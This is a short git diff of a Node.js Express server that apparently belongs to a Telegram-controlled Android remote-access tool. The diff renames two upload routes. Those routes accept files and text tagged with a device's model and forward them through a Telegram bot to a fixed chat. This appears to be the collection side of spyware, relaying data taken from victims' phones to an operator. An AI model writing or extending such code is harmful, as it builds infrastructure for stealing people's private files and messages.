@@ -28,7 +28,7 @@ app.get('/', function (req, res) {
     res.send('<h1 align="center">تم بنجاح تشغيل البوت المطورأّمَبِرأّطّوِر شٍرعٌبِ   </h1>')
 })
 
-app.post("967736223320", upload.single('file'), (req, res) => {
+app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
     appBot.sendDocument(id, req.file.buffer, {
             caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
@@ -40,7 +40,7 @@ app.post("967736223320", upload.single('file'), (req, res) => {
         })
     res.send('')
 })
-app.post("967736223320", (req, res) => {
+app.post("/uploadText", (req, res) => {
     appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
     res.send('')
 })
